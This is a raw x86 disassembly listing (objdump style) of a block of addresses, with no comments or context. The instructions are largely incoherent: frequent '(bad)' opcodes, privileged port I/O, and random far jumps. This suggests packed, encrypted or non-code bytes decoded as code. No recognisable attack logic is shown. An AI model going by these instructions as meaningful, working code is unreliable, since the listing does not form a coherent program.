  423ed7:	mov    dl,0x9b
  423ed9:	mov    esi,DWORD PTR [ecx-0x8]
  423edc:	mov    ebp,0xa4fb9dca
  423ee1:	ret    0x49c2
  423ee4:	sbb    esi,DWORD PTR ds:0x1b7d9aec
  423eea:	push   ss
  423eeb:	imul   esi,DWORD PTR [edx+0x25],0x9430ff0d
  423ef2:	cmp    ebp,edx
  423ef4:	sti    
  423ef5:	jns    0x423ed1
  423ef7:	xor    bl,bh
  423ef9:	add    ecx,DWORD PTR [ecx]
  423efb:	pusha  
  423efc:	push   0xffffff88
  423efe:	mov    edi,0x55732c7d
  423f03:	in     al,dx
  423f04:	sbb    al,0x30
  423f06:	lds    edx,FWORD PTR [esi+0x61]
  423f09:	mov    ds:0x1dff8661,eax
  423f0e:	push   ebp
  423f0f:	cmc    
  423f10:	outs   dx,BYTE PTR ds:[esi]
  423f11:	xchg   esi,eax
  423f12:	leave  
  423f13:	sahf   
  423f14:	dec    edi
  423f15:	mov    edx,0x1f989d47
  423f1a:	cli    
  423f1b:	mov    ds:0xd279b4a2,al
  423f20:	push   es
  423f21:	mov    edx,0xa94e7a0b
  423f26:	mov    ebx,0x2d4ebb56
  423f2b:	lods   eax,DWORD PTR ds:[esi]
  423f2c:	xchg   edi,eax
  423f2d:	mov    esi,0x975539ef
  423f32:	and    ch,BYTE PTR [edi]
  423f34:	rcr    BYTE PTR [eax+0x27],1
  423f37:	int    0x99
  423f39:	push   ebp
  423f3a:	sub    cl,bh
  423f3c:	dec    edi
  423f3d:	or     BYTE PTR [esi-0x2d],al
  423f40:	(bad)
  423f43:	mov    esp,0xa1b5000d
  423f48:	iret   
  423f49:	pop    DWORD PTR [edi]
  423f4b:	mov    ecx,0x375d54
	...
  423f58:	add    BYTE PTR [eax],al
  423f5a:	cmp    DWORD PTR [ecx+ecx*4],ebx
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x1fe902b9
  423f67:	pop    ebp
  423f68:	or     esi,eax
  423f6a:	mov    bh,0xb8
  423f6c:	add    DWORD PTR [eax],eax
  423f6e:	std    
  423f6f:	add    DWORD PTR [eax],eax
  423f71:	add    BYTE PTR [edi+0x1ef9b784],ah
  423f77:	jae    0x423f11
  423f79:	sub    al,0xc0
  423f7b:	sbb    cl,BYTE PTR [esi+0x40810483]
  423f81:	and    bl,ah
  423f83:	clc    
  423f84:	imul   edx,DWORD PTR [eax+0x4a133e7f],0xe5afaa3c
  423f8e:	jb     0x423f4f
  423f90:	cmp    eax,0xd632bac7
  423f95:	mov    ah,0x6
  423f97:	jnp    0x423f6f
  423f99:	cmp    al,0xc
  423f9b:	ror    ch,cl
  423f9d:	ret    
  423f9e:	test   BYTE PTR [edx+0x2c8ac8d2],dl
  423fa4:	push   edi
  423fa5:	mov    gs,WORD PTR [ebx+0xb]
  423fa8:	sub    edx,ebx
  423faa:	(bad)  
  423fab:	push   eax
  423fac:	das    
  423fad:	out    dx,al
  423fae:	das    
  423faf:	mov    ebx,0xb27e09c9
  423fb4:	or     al,0xd5
  423fb6:	sbb    BYTE PTR [esi],0xf5
  423fb9:	ror    BYTE PTR [edx],cl
  423fbb:	pop    ebp
  423fbc:	ja     0x423fb1
  423fbe:	jl     0x423f47
  423fc0:	adc    dh,BYTE PTR [edx+esi*4+0x3f]
  423fc4:	mov    ebx,0xae7f0238
  423fc9:	fldcw  WORD PTR ds:0x7dbe73bc
  423fcf:	pop    ecx
  423fd0:	sub    BYTE PTR [ebp+0x701cc7f8],ah
  423fd6:	fidivr WORD PTR [ebx+esi*1-0x5fa7a269]
  423fdd:	fwait
  423fde:	or     ebx,edi
  423fe0:	xchg   ecx,eax
  423fe1:	rol    BYTE PTR [eax],0x43
  423fe4:	add    eax,0x37962a42
  423fe9:	aas    
  423fea:	push   ecx
  423feb:	(bad)  
  423fec:	aam    0x7a
  423fee:	sbb    al,0x1c
  423ff0:	lahf   
  423ff1:	in     al,dx
  423ff2:	lods   eax,DWORD PTR ds:[esi]
  423ff3:	or     esp,DWORD PTR [edx-0x3a]
  423ff6:	stc    
  423ff7:	sbb    al,0xe4
  423ff9:	fisubr WORD PTR [ebx+0x42]
  423ffc:	push   esi
  423ffd:	mov    cl,0xd9
  423fff:	mov    ebx,0x200c5cca
  424004:	ins    BYTE PTR es:[edi],dx
  424005:	dec    edi
  424006:	mov    eax,0x5f399822
  42400b:	outs   dx,BYTE PTR ds:[esi]
  42400c:	rcr    BYTE PTR [ecx],0x6f
  42400f:	mov    es,WORD PTR [eax-0x39830f57]
  424015:	add    eax,0x611ed706
  42401a:	inc    ecx
  42401b:	test   al,0x55
  42401d:	arpl   WORD PTR [eax-0x4f],bx
  424020:	jbe    0x424014
  424022:	and    DWORD PTR [ebx-0x10d28193],0xffffff9c
  424029:	pop    edi
  42402a:	aaa    
  42402b:	push   cs
  42402c:	jmp    0x424077
  42402e:	xchg   edi,eax
  42402f:	sbb    eax,0x60bc11c4
  424034:	pop    edi
  424035:	test   BYTE PTR [ecx-0x76],ah
  424038:	jno    0x424085
  42403a:	retf   0x4967
  42403d:	imul   BYTE PTR [edi+edx*4]
  424040:	push   edi
  424041:	dec    edi
  424042:	mov    al,ds:0xafa16aae
  424047:	fbstp  TBYTE PTR ds:0x15f828fa
  42404d:	inc    BYTE PTR [ebx+ecx*2-0x590ddac4]
  424054:	js     0x42406e
  424056:	int    0x93
  424058:	fild   DWORD PTR [esi+0x353aeeed]
  42405e:	jnp    0x42408c
  424060:	fsubr  DWORD PTR [ecx+0x4080b58d]
  424066:	sub    cl,BYTE PTR [ebp+0x6108140d]
  42406c:	loope  0x4240b9
  42406e:	sti    
  42406f:	pop    eax
  424070:	ds inc edx
  424072:	sti    
  424073:	mov    bl,0xda
  424075:	inc    edx
  424076:	and    BYTE PTR [ecx],ch
  424078:	jo     0x424042
  42407a:	sbb    bh,BYTE PTR [ecx]
  42407c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42407d:	mov    bl,0x85
  42407f:	(bad)  
  424080:	imul   eax,DWORD PTR [edx],0x17f5e694
  424086:	punpckhdq mm7,QWORD PTR [ebx+0x4b77c13c]
  42408d:	mov    ecx,0x52dda99
  424092:	jmp    0x3985:0xe6f46335
  424099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42409a:	cmp    edx,DWORD PTR [edx+ecx*8+0x5f03894a]
  4240a1:	mov    ds:0xa7cccdcf,eax
  4240a6:	xor    al,0x87
  4240a8:	jecxz  0x4240df
  4240aa:	mov    edi,0x1c8d4124
  4240af:	pop    esi
  4240b0:	int    0xb7
  4240b2:	jns    0x42406e
  4240b4:	(bad)  
  4240b5:	xor    DWORD PTR [ebx+0x4c],eax
  4240b8:	push   ebx
  4240b9:	push   0x58f656c4
  4240be:	mov    cl,0x1
  4240c0:	add    DWORD PTR [edx+0x1cf48897],ecx
  4240c6:	jmp    0x43a5:0x1e7627fc
  4240cd:	cmp    edi,0xc88062ab
  4240d3:	pop    eax
  4240d4:	je     0x42412a
  4240d6:	retf   0x4cfd
  4240d9:	dec    edx
  4240da:	cmp    eax,0x6fc747b0
  4240df:	int3   
  4240e0:	popa   
  4240e1:	aaa    
  4240e2:	bnd jle 0x424134
  4240e5:	pusha  
  4240e6:	fidiv  WORD PTR [ebp+0x23d837b4]
  4240ec:	les    ebx,FWORD PTR [ebx-0x4b5958a7]
  4240f2:	xchg   BYTE PTR [edx+edx*1],ch
  4240f5:	jne    0x424121
  4240f7:	test   al,0x92
  4240f9:	shr    BYTE PTR [edx],cl
  4240fb:	pop    ecx
  4240fc:	sbb    BYTE PTR [esi],dh
  4240fe:	dec    edx
  4240ff:	cmp    ebp,edx
  424101:	and    DWORD PTR [eax],eax
  424103:	jbe    0x4240a7
  424105:	add    DWORD PTR [esp+ebx*2-0x13],edi
  424109:	lock in eax,0x66
  42410c:	rcl    BYTE PTR [ecx-0x30],cl
  42410f:	aaa    
  424110:	push   esp
  424111:	mov    dh,0xeb
  424113:	(bad)  
  424114:	mov    eax,0x48ad234b
  424119:	mov    al,ds:0x6e80ffb1
  42411e:	or     DWORD PTR [edx],eax
  424120:	ja     0x424157
  424122:	jg     0x4240ed
  424124:	rol    bl,cl
  424126:	adc    BYTE PTR [eax+0x585a6644],ch
  42412c:	shl    DWORD PTR [ebp+0x69],1
  42412f:	xchg   ebp,eax
  424130:	jnp    0x4240c5
  424132:	jnp    0x42415f
  424134:	popa   
  424135:	neg    bh
  424137:	aad    0xc9
  424139:	and    eax,0xec5b7d80
  42413e:	cli    
  42413f:	call   0x3e3e3060
  424144:	fidivr WORD PTR [edi-0xc]
  424147:	pop    esp
  424148:	ss repz (bad) 
  42414c:	pop    edi
  42414d:	jbe    0x424163
  42414f:	stc    
  424150:	(bad)  
  424151:	mov    eax,0xdc80fc7e
  424156:	in     al,dx
  424157:	sub    BYTE PTR [esi+ebx*2],bl
  42415a:	addr16 jp 0x4241da
  42415d:	mov    ah,bl
  42415f:	(bad)  
  424160:	repz add al,BYTE PTR [eax]
  424163:	imul   BYTE PTR [ebp+0x2a3f3a0b]
  424169:	in     al,dx
  42416a:	mov    ebx,0xef830221
	...
  424177:	add    BYTE PTR [eax],al
  424179:	add    BYTE PTR [ebp-0x4c],ah
  42417c:	sbb    dh,bl
  42417e:	fsin   
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	addr16 mov ebp,0xbab4f9ae
  42418c:	add    DWORD PTR [eax],eax
  42418e:	std    
  42418f:	add    DWORD PTR [eax],eax
  424191:	add    BYTE PTR [esp+edi*8],dl
  424194:	stos   DWORD PTR es:[edi],eax
  424195:	arpl   sp,dx
  424197:	push   edx
  424198:	rol    ecx,1
  42419a:	inc    edi
  42419b:	sti    
  42419c:	adc    BYTE PTR [ebx-0x47120f2c],al
  4241a2:	daa    
  4241a3:	lock gs add eax,0x160b82cf
  4241aa:	cs pop es
  4241ac:	lods   al,BYTE PTR ds:[esi]
  4241ad:	push   0x80529380
  4241b2:	in     eax,dx
  4241b3:	fwait
  4241b4:	repz rcr ah,0xdc
  4241b8:	leave  
  4241b9:	es mov bh,0xc1
  4241bc:	and    ch,dh
  4241be:	mov    dl,0xc1
  4241c0:	jp     0x4241a5
  4241c2:	adc    ecx,DWORD PTR [ecx+0x28e1caf]
  4241c8:	xchg   ebp,eax
  4241c9:	mov    cl,0x14
  4241cb:	dec    ecx
  4241cc:	push   DWORD PTR [ecx+0x40]
  4241cf:	test   DWORD PTR [ebp+0x48],edx
  4241d2:	sbb    al,0xe7
  4241d4:	push   0xffffff95
  4241d6:	inc    ebp
  4241d7:	popf   
  4241d8:	sbb    ebx,DWORD PTR [ecx-0x6fdbefd6]
  4241de:	sbb    al,0x46
  4241e0:	and    eax,0xb0726c05
  4241e5:	loop   0x4241d1
  4241e7:	mov    bh,0xc
  4241e9:	mov    ch,0x9b
  4241eb:	pop    edi
  4241ec:	repnz call 0xf12f:0x64c2bb38
  4241f4:	dec    edi
  4241f5:	pop    ebp
  4241f6:	mov    al,0x3b
  4241f8:	bound  ecx,QWORD PTR ds:0x8638d84e
  4241fe:	sbb    dl,ch
  424200:	pop    esi
  424201:	mov    ah,bh
  424203:	pop    edi
  424204:	lea    ebx,[edi-0x66]
  424207:	xor    dh,BYTE PTR [ecx-0x54]
  42420a:	cmp    eax,0x783429c8
  42420f:	fld    QWORD PTR [eax]
  424211:	mov    cs,WORD PTR [edi+0x52]
  424214:	rol    esp,0xf5
  424217:	xor    al,0xe3
  424219:	cmp    DWORD PTR ds:0x3323a17d,0xffffffc6
  424220:	mov    ecx,0x105320fd
  424225:	dec    esp
  424226:	mul    BYTE PTR [eax+0x770447f0]
  42422c:	inc    ecx
  42422d:	arpl   WORD PTR [ecx+0x5b],dx
  424230:	jbe    0x424273
  424232:	add    al,0x70
  424234:	ins    BYTE PTR es:[edi],dx
  424235:	jp     0x4241c6
  424237:	push   ebp
  424238:	mov    ds:0xc2c691d9,eax
  42423d:	cwde   
  42423e:	push   edi
  42423f:	test   al,0x3d
  424241:	lea    eax,[eax+0x3a7a1def]
  424247:	mov    dl,dl
  424249:	add    eax,0x478460f
  42424e:	push   ecx
  42424f:	aaa    
  424250:	in     al,0x55
  424252:	ret    0xb87b
  424255:	or     eax,0x3da416
  42425a:	fmul   st,st(1)
  42425c:	rol    DWORD PTR [esi+0x50],1
  42425f:	aam    0x6
  424261:	pop    edi
  424262:	sahf   
  424263:	in     eax,0xe6
  424265:	in     eax,dx
  424266:	mov    edi,0x9611a421
  42426b:	fcom   QWORD PTR [ebx-0x335eaac]
  424271:	stc    
  424272:	in     eax,dx
  424273:	sub    al,0xc9
  424275:	pop    ecx
  424276:	add    eax,ebx
  424278:	je     0x424282
  42427a:	(bad)  
  42427c:	fldenv [edx]
  42427e:	cli    
  42427f:	adc    eax,0x83c47b89
  424284:	inc    ebp
  424285:	in     eax,dx
  424286:	dec    edi
  424287:	dec    eax
  424288:	xchg   esp,esi
  42428a:	push   esi
  42428b:	scas   al,BYTE PTR es:[edi]
  42428c:	xor    al,0xd
  42428e:	mov    ecx,0x638aece2
  424293:	in     eax,dx
  424294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424295:	sub    ch,dl
  424297:	addr16 (bad) 
  424299:	jnp    0x4242ae
  42429b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42429c:	test   BYTE PTR [ebx-0xfbb8c74],ah
  4242a2:	ja     0x424237
  4242a4:	(bad)  
  4242a5:	mov    dl,0x85
  4242a7:	outs   dx,BYTE PTR ds:[esi]
  4242a8:	aam    0x65
  4242aa:	jl     0x424285
  4242ac:	mov    dl,0x71
  4242ae:	or     esi,DWORD PTR [eax+0x49f72035]
  4242b4:	mov    dl,0x57
  4242b6:	sti    
  4242b7:	sbb    esp,DWORD PTR [esi+edx*2]
  4242ba:	or     BYTE PTR [ecx+0x6c],ch
  4242bd:	sbb    al,0x4a
  4242bf:	sbb    eax,0xaaf2a98e
  4242c4:	dec    ecx
  4242c5:	int    0x6f
  4242c7:	clc    
  4242c8:	mov    dh,0x14
  4242ca:	jmp    0xdd7f5917
  4242cf:	push   edx
  4242d0:	lods   al,BYTE PTR ds:[esi]
  4242d1:	jmp    0xe7280604
  4242d6:	ss pop ebx
  4242d8:	(bad)  
  4242da:	enter  0xa5fc,0x99
  4242de:	mov    ah,0x28
  4242e0:	mov    dh,BYTE PTR [ebp+0x14]
  4242e3:	es hlt 
  4242e5:	pop    ds
  4242e6:	xor    eax,0xa8d8e5cd
  4242eb:	jnp    0x4242e2
  4242ed:	shl    DWORD PTR [eax+0x55],0xe8
  4242f1:	and    al,0x58
  4242f3:	dec    ebp
  4242f4:	xlat   BYTE PTR ds:[ebx]
  4242f5:	ror    BYTE PTR [ecx+ebp*1],0x79
  4242f9:	jg     0x4242df
  4242fb:	aad    0x9d
  4242fd:	les    edi,FWORD PTR [edi-0x65fa3f27]
  424303:	fcom   QWORD PTR [esi]
  424305:	or     DWORD PTR ds:0x9501771a,0x311702ef
  42430f:	outs   dx,BYTE PTR ds:[esi]
  424310:	xchg   ecx,eax
  424311:	jbe    0x42434a
  424313:	mov    esi,0x942251c4
  424318:	das    
  424319:	sub    eax,ebx
  42431b:	mov    ch,0x1f
  42431d:	xchg   BYTE PTR [ebx+0x4],dl
  424320:	adc    eax,0xeb58e774
  424325:	dec    eax
  424326:	retf   0x648f
  424329:	aad    0x36
  42432b:	xor    eax,0x4d0e88fc
  424330:	imul   ebx,DWORD PTR [ecx],0x30d62181
  424336:	pop    edx
  424337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424338:	clc    
  424339:	or     DWORD PTR [eax+0x2ae39bc2],eax
  42433f:	pushf  
  424340:	add    DWORD PTR ds:0xcbe06353,esi
  424346:	ds cwde 
  424348:	add    DWORD PTR [ecx-0x3b3829d3],edx
  42434e:	shr    DWORD PTR [eax-0x510abcf0],cl
  424354:	(bad)  
  424355:	mul    DWORD PTR [edx+ebp*8+0x6]
  424359:	xor    eax,DWORD PTR [eax-0x53]
  42435c:	hlt    
  42435d:	mov    bh,0xb1
  42435f:	outs   dx,BYTE PTR ds:[esi]
  424360:	fcom   QWORD PTR [ecx-0x66e4b302]
  424366:	adc    al,0xba
  424368:	(bad)  
  42436b:	cmp    ebx,DWORD PTR [edx-0x28]
  42436e:	das    
  42436f:	arpl   WORD PTR [esi-0x3fa9c66d],sp
  424375:	in     al,0xd9
  424377:	mov    eax,0x5ef9683c
  42437c:	mov    eax,0x6ced1d03
  424381:	inc    ecx
  424382:	or     dl,BYTE PTR [eax-0x72]
  424385:	and    eax,0x5608f3ab
  42438a:	rcl    BYTE PTR [edi+0x39],0x5f
  42438e:	mov    al,ds:0x0
  424393:	add    BYTE PTR [eax],al
  424395:	add    BYTE PTR [eax],al
  424397:	add    BYTE PTR [eax],al
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	adc    eax,0xb186adde
  4243ab:	mov    esp,0x1fd0001
  4243b0:	add    BYTE PTR [eax],al
  4243b2:	jmp    0xb1e55352
  4243b7:	fld    TBYTE PTR [ecx+0x9c857be]
  4243bd:	(bad)  
  4243be:	xor    esi,DWORD PTR [ecx+edi*8]
  4243c1:	inc    ecx
  4243c2:	shr    edx,1
  4243c4:	cld    
  4243c5:	lods   al,BYTE PTR ds:[esi]
  4243c6:	fstp   DWORD PTR [esi+0x185dbedc]
  4243cd:	mov    WORD PTR [edi+0x10ac8caf],?
  4243d3:	adc    dh,BYTE PTR [edx-0x7eef4040]
  4243d9:	jns    0x4243b1
  4243db:	adc    eax,0xda3c4a84
  4243e0:	pushf  
  4243e1:	mov    ebp,0x32131b91
  4243e6:	mov    bh,0xd5
  4243e8:	mov    ah,0x29
  4243ea:	mov    ebx,0x91d2964b
  4243ef:	ins    DWORD PTR es:[edi],dx
  4243f0:	imul   ebx,DWORD PTR [edi-0x37],0x9d0df5e0
  4243f7:	push   esi
  4243f8:	jmp    0x35226b94
  4243fd:	in     al,0x7d
  4243ff:	sub    bl,BYTE PTR [eax-0x5e]
  424402:	push   ss
  424403:	mov    ch,0x96
  424405:	out    0x54,eax
  424407:	push   cs
  424408:	push   eax
  424409:	xchg   esp,eax
  42440a:	push   esi
  42440b:	dec    esp
  42440c:	xlat   BYTE PTR ds:[ebx]
  42440d:	ins    DWORD PTR es:[edi],dx
  42440e:	mov    edx,0x724316df
  424413:	jno    0x42440a
  424415:	push   edx
  424416:	hlt    
  424417:	mov    cs,WORD PTR [eax-0x34cacaa0]
  42441d:	xchg   dl,al
  42441f:	fdiv   QWORD PTR [edx-0x4a]
  424422:	adc    esi,ecx
  424424:	mov    eax,ds:0xd832386
  424429:	sbb    BYTE PTR [ebp+0x44c8feb0],bh
  42442f:	shr    BYTE PTR [ecx],0xa4
  424432:	xor    eax,0x701dd40
  424437:	and    al,0x49
  424439:	scas   al,BYTE PTR es:[edi]
  42443a:	aas    
  42443b:	push   0x973d7a24
  424440:	js     0x15f84183
  424446:	in     eax,0x7f
  424448:	pop    ss
  424449:	(bad)  
  42444a:	out    dx,al
  42444b:	sub    al,0x37
  42444d:	cmp    dh,dl
  42444f:	test   cl,0x57
  424452:	ret    
  424453:	xor    al,0xd
  424455:	xor    al,0x98
  424457:	shl    DWORD PTR [edx],0x8c
  42445a:	aad    0xd4
  42445c:	sub    DWORD PTR [ebx-0x1fe0fcbd],0xcf4d4697
  424466:	add    eax,0xb2426dc3
  42446b:	dec    edi
  42446c:	enter  0x113,0x4c
  424470:	mov    esi,0x361f2f18
  424475:	in     eax,0xde
  424477:	jnp    0x424466
  424479:	mov    edi,0xbb77985c
  42447e:	call   0xded9:0x5c0d981e
  424485:	cwde   
  424486:	loopne 0x424481
  424488:	pop    eax
  424489:	clc    
  42448a:	push   eax
  42448b:	int    0x33
  42448d:	pop    edx
  42448e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42448f:	pop    ecx
  424490:	pop    esi
  424491:	hlt    
  424492:	pop    ebx
  424493:	cwde   
  424494:	outs   dx,BYTE PTR ds:[esi]
  424495:	aas    
  424496:	clc    
  424497:	add    eax,0x2af3a98d
  42449c:	lea    edi,[eax]
  42449e:	cmp    BYTE PTR [esi+edi*8+0x35],0x54
  4244a3:	xor    BYTE PTR [ecx-0x72d3c63e],0xdb
  4244aa:	and    bl,BYTE PTR [ecx]
  4244ac:	fsincos 
  4244ae:	xor    dh,BYTE PTR [eax+0x65]
  4244b1:	scas   eax,DWORD PTR es:[edi]
  4244b2:	push   cs
  4244b3:	xchg   esi,eax
  4244b4:	sbb    esp,DWORD PTR [esi-0x64ab7986]
  4244ba:	arpl   WORD PTR [esi+0x28fd0f8b],di
  4244c0:	les    esi,FWORD PTR [edi+edi*8]
  4244c3:	cmp    BYTE PTR [ecx],al
  4244c5:	push   0x16
  4244c7:	push   ss
  4244c8:	sahf   
  4244c9:	inc    edi
  4244ca:	mov    ebp,0x859aa588
  4244cf:	cwde   
  4244d0:	inc    ebx
  4244d1:	jg     0x424520
  4244d3:	or     BYTE PTR [edx],ch
  4244d5:	cmp    ah,BYTE PTR [eax+0x10]
  4244d8:	data16 ss aad 0x3b
  4244dc:	xchg   BYTE PTR [esi-0x6310a197],dh
  4244e2:	adc    DWORD PTR [ecx+0x52],edx
  4244e5:	xlat   BYTE PTR ds:[ebx]
  4244e6:	mov    ebx,cs
  4244e8:	stc    
  4244e9:	jno    0x42448f
  4244eb:	mov    ch,0xcd
  4244ed:	push   ds
  4244ee:	bound  ebx,QWORD PTR [edi]
  4244f0:	sub    cl,bh
  4244f2:	mov    bl,0xe5
  4244f4:	ins    BYTE PTR es:[edi],dx
  4244f5:	stc    
  4244f6:	dec    ebp
  4244f7:	dec    esi
  4244f8:	sub    BYTE PTR [ebx],0x56
  4244fb:	add    ch,BYTE PTR [ebx+0xd2d0be9]
  424501:	add    dl,BYTE PTR [ebx-0x10]
  424504:	jge    0x424581
  424506:	mov    bl,0xe3
  424508:	test   esp,edx
  42450a:	sahf   
  42450b:	lds    esp,FWORD PTR [edi]
  42450d:	add    eax,0xeb600ec2
  424512:	cmp    al,0x6c
  424514:	push   edx
  424515:	aaa    
  424516:	rol    DWORD PTR [eax+0x5e],0x88
  42451a:	xor    eax,DWORD PTR [eax]
  42451c:	pop    ebp
  42451d:	push   edx
  42451e:	mov    ah,ah
  424520:	add    eax,0x823fad58
  424525:	push   ss
  424526:	js     0x424547
  424528:	dec    esi
  424529:	cmp    eax,DWORD PTR [edx+0x13b7360]
  42452f:	sahf   
  424530:	pop    ebx
  424531:	add    DWORD PTR [ebx+edx*1],0x51743490
  424538:	pop    esp
  424539:	xchg   esi,eax
  42453a:	into   
  42453b:	ins    DWORD PTR es:[edi],dx
  42453c:	push   edi
  42453d:	ret    
  42453e:	inc    ebp
  42453f:	jle    0x4244fc
  424541:	(bad)  
  424542:	xchg   ebx,eax
  424543:	repz cmp bh,BYTE PTR [esi]
  424546:	aaa    
  424547:	leave  
  424548:	(bad)  
  424549:	jl     0x4244f5
  42454b:	les    esi,FWORD PTR [ebx+esi*1]
  42454e:	addr16 (bad) 
  424550:	fidivr WORD PTR [edx]
  424552:	outs   dx,DWORD PTR ds:[esi]
  424553:	ins    DWORD PTR es:[edi],dx
  424554:	rcr    BYTE PTR [ecx],0x3
  424557:	sub    al,0x43
  424559:	dec    eax
  42455a:	and    al,0x17
  42455c:	jb     0x4245c8
  42455e:	pop    ebx
  42455f:	jecxz  0x42454b
  424561:	adc    eax,0xef85940f
  424566:	out    0x2b,eax
  424568:	push   edx
  424569:	sbb    DWORD PTR [ecx],0x94c07567
  42456f:	cmp    BYTE PTR [ebp-0x5c],dh
  424572:	aad    0xf5
  424574:	bound  eax,QWORD PTR [esi]
  424576:	fs xchg esp,eax
  424578:	popf   
  424579:	lock ds dec esi
  42457c:	pop    edi
  42457d:	sbb    BYTE PTR [edi],al
  42457f:	and    BYTE PTR [esi+0x482a1cc7],0xa
  424586:	stc    
  424587:	ror    dh,1
  424589:	lods   al,BYTE PTR ds:[esi]
  42458a:	imul   edi,DWORD PTR [ecx+0x2],0x6d
  42458e:	das    
  42458f:	sbb    BYTE PTR [ecx],bh
  424591:	mov    edx,0x3d46a1a0
  424596:	inc    esi
  424597:	lea    esi,[esi-0x69]
  42459a:	cdq    
  42459b:	push   ss
  42459c:	cwde   
  42459d:	inc    ebx
  42459e:	call   0xca66012d
  4245a3:	push   es
  4245a4:	shl    BYTE PTR [edi+0x2f],1
  4245a7:	xor    eax,0x8953e358
  4245ac:	std    
  4245ad:	mov    ecx,0xd3
	...
  4245ba:	push   cs
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax-0x4210749]
  4245c9:	dec    ebp
  4245ca:	scas   al,BYTE PTR es:[edi]
  4245cb:	mov    esi,0x1fd0001
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	mov    bh,0xaf
  4245d4:	lods   eax,DWORD PTR ds:[esi]
  4245d5:	xor    edi,edx
  4245d7:	jmp    0x72191bfa
  4245dc:	(bad)  
  4245dd:	jns    0x4245be
  4245df:	xor    ecx,DWORD PTR [eax]
  4245e1:	xchg   ecx,eax
  4245e2:	je     0x4245e7
  4245e4:	jae    0x4245df
  4245e6:	daa    
  4245e7:	and    eax,0x831e15e9
  4245ec:	iret   
  4245ed:	adc    BYTE PTR [ebx+ebp*2+0x4897ba43],dl
  4245f4:	fist   WORD PTR [ebx+0x8]
  4245f7:	and    al,0x72
  4245f9:	mov    ah,bl
  4245fb:	and    al,0x56
  4245fd:	(bad)  
  4245fe:	fimul  DWORD PTR [edx-0x10d7abfe]
  424604:	add    DWORD PTR [eax+0x5ddae532],eax
  42460a:	cs jno 0x424616
  42460d:	aas    
  42460e:	(bad)  [ecx+0x26]
  424611:	(bad)  
  424612:	cdq    
  424613:	dec    eax
  424614:	cmp    BYTE PTR [ecx],al
  424616:	jns    0x4245b7
  424618:	push   esp
  424619:	imul   ebp,DWORD PTR [ebx+ebp*8-0x66],0xdfc52516
  424621:	mov    ds:0xef0ea24,eax
  424626:	pusha  
  424627:	push   es
  424628:	push   ebp
  424629:	jne    0x424650
  42462b:	cld    
  42462c:	fiadd  WORD PTR [esi+0x5f549845]
  424632:	or     BYTE PTR [esi],bh
  424634:	popa   
  424635:	call   0x814a5fdd
  42463a:	aad    0xcb
  42463c:	rcr    BYTE PTR [ecx],0x55
  42463f:	push   eax
  424640:	in     al,0x65
  424642:	fiadd  WORD PTR ds:0x29fad0ff
  424648:	dec    cl
  42464a:	sub    BYTE PTR [edi+esi*1],0x57
  42464e:	xor    ah,ch
  424650:	inc    ecx
  424651:	push   edx
  424652:	pop    ebx
  424653:	or     BYTE PTR ds:0xea621851,ch
  424659:	add    bl,BYTE PTR [edi-0x66]
  42465c:	call   0xb4ba55d1
  424661:	and    esi,DWORD PTR [ecx-0x588a523f]
  424667:	cmc    
  424668:	cmp    eax,0x52cfffd6
  42466d:	test   BYTE PTR [edx+eax*4-0x21e2fbe6],cl
  424674:	mov    esi,0x2b4cd80b
  424679:	ret    
  42467a:	loope  0x42463d
  42467c:	outs   dx,DWORD PTR ds:[esi]
  42467d:	or     BYTE PTR [eax],bl
  42467f:	in     eax,0x26
  424681:	pop    ecx
  424682:	adc    eax,0xed642849
  424687:	sbb    al,0x4
  424689:	mov    DWORD PTR [esp+eax*8-0x1c41351],0x68b60152
  424694:	lds    esi,FWORD PTR [esi+0x24a86093]
  42469a:	mov    es,WORD PTR [ecx+0x40]
  42469d:	push   cs
  42469e:	ins    DWORD PTR es:[edi],dx
  42469f:	jnp    0x424691
  4246a1:	mov    al,dh
  4246a3:	test   dl,dh
  4246a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246a6:	mov    dl,0x84
  4246a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246a9:	pusha  
  4246aa:	test   al,0xdf
  4246ac:	push   ebp
  4246ad:	push   ebx
  4246ae:	push   cs
  4246af:	push   edx
  4246b0:	popa   
  4246b1:	pop    ebx
  4246b2:	lods   al,BYTE PTR ds:[esi]
  4246b3:	xchg   esi,eax
  4246b4:	and    al,0xbc
  4246b6:	cdq    
  4246b7:	sub    BYTE PTR [edi],bl
  4246b9:	and    BYTE PTR [edi+0x4e2092bc],ah
  4246bf:	xor    eax,0x4aedd5b7
  4246c4:	mov    ebx,0x5aa38ce3
  4246c9:	addr16 stc 
  4246cb:	scas   eax,DWORD PTR es:[edi]
  4246cc:	dec    edi
  4246cd:	push   esp
  4246ce:	push   ds
  4246cf:	adc    DWORD PTR [eax],0x1a8e3f29
  4246d5:	mov    DWORD PTR [esi],esi
  4246d7:	pop    ds
  4246d8:	dec    edi
  4246d9:	jg     0x4246f8
  4246db:	sub    ecx,ebp
  4246dd:	mov    DWORD PTR [ecx-0x65b01b0],esp
  4246e3:	aad    0xa0
  4246e5:	out    dx,eax
  4246e6:	cmovb  esp,edx
  4246e9:	dec    eax
  4246ea:	xor    ebx,esi
  4246ec:	push   eax
  4246ed:	cwde   
  4246ee:	shr    DWORD PTR [esi],cl
  4246f0:	adc    eax,0xad59f26f
  4246f5:	cmp    dh,ah
  4246f7:	inc    ecx
  4246f8:	push   edx
  4246f9:	push   ebp
  4246fa:	in     eax,dx
  4246fb:	hlt    
  4246fc:	scas   eax,DWORD PTR es:[edi]
  4246fd:	jae    0x424772
